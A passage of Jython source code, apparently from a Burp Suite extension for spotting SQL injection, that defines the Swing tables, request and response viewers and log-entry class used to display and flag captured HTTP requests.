        def getVulnerableStatus(self, rowIndex):
            global log3
            if rowIndex >= 0 and rowIndex < len(log3):
                return log3[rowIndex].is_vulnerable
            return False

    class FirstModel (AbstractTableModel):

        def getRowCount(self):
            return len(log)

        def getColumnCount(self):
            return 5

        def getColumnName(self,columnIndex):
            if columnIndex==0:
                return unicode("#","utf-8")
            elif columnIndex==1:
                return unicode("时间","utf-8")
            elif columnIndex==2:
                return unicode("接口","utf-8")
            elif columnIndex==3:
                return unicode("返回包长度","utf-8")
            elif columnIndex==4:
                return unicode("状态","utf-8")
            else:
                return ""

        def getColumnClass(self,columnIndex):
            return str

        def getValueAt(self,rowIndex, columnIndex):
            global helpers
            logEntry = log[rowIndex]
            if columnIndex==0:
                return logEntry.id
            elif columnIndex==1:
                return time.strftime("%H:%M:%S",time.localtime(logEntry.time))
            elif columnIndex==2:
                url =URL(logEntry.url.toString())
                return url.getPath()
            elif columnIndex==3:
                if logEntry.requestResponse.getResponse()==None:
                    return 0
                tmp = helpers.bytesToString(logEntry.requestResponse.getResponse())
                return len(tmp)-tmp.find("\r\n\r\n")-4

            elif columnIndex==4:
                return logEntry.state
            else:
                return ""

    class FirstTable(swing.JTable):

        def changeSelection(self,row, col, toggle, extend):
            global secondModel,firstModel,log,log2,log3,currentlyDisplayedItem
            logEntry = log[row]
            data_md5_id = logEntry.data_md5
            if data_md5_id in log2:
                log3=log2[data_md5_id]
            else:
                log3=[]

            secondModel.fireTableRowsInserted(len(log3), len(log3))
            secondModel.fireTableDataChanged()
            requestViewer.setMessage(logEntry.requestResponse.getRequest(), True)
            if logEntry.requestResponse.getResponse()==None:
                responseViewer.setMessage("", False)
            else:
                responseViewer.setMessage(logEntry.requestResponse.getResponse(), False)
            currentlyDisplayedItem=logEntry.requestResponse

            swing.JTable.changeSelection(self, row, col, toggle, extend)

    class SecondTable(swing.JTable):
        def __init__(self,secondTableModel):
            swing.JTable.__init__(self,secondTableModel)
            # 应用自定义渲染器到所有列
            renderer = BurpExtender.VulnerableCellRenderer()
            for i in range(self.getColumnCount()):
                self.getColumnModel().getColumn(i).setCellRenderer(renderer)

        def changeSelection(self, row, col, toggle, extend):
            global requestViewer,responseViewer,log3,currentlyDisplayedItem
            logEntry = log3[row]
            requestViewer.setMessage(logEntry.requestResponse.getRequest(), True)
            if logEntry.requestResponse.getResponse()==None:
                responseViewer.setMessage("", False)
            else:
                responseViewer.setMessage(logEntry.requestResponse.getResponse(), False)
            currentlyDisplayedItem=logEntry.requestResponse

            swing.JTable.changeSelection(self, row, col, toggle, extend)

    class LogEntry():

        def __init__(self,id, requestResponse, url,parameter,value,change,data_md5,times,state,response_code,contentlen):
            self.id = id
            self.time = time.time()
            self.requestResponse = requestResponse
            self.contentlen = contentlen
            self.url = url
            self.parameter = parameter
            self.value = value
            self.change = change
            self.data_md5 = data_md5
            self.times = times
            self.state = state
            self.response_code = response_code
            self.is_vulnerable = False  # 新增字段：标识是否检测到SQL注入漏洞

        def setState(self,state):
            self.state = state

        def setVulnerable(self,is_vulnerable):
            self.is_vulnerable = is_vulnerable
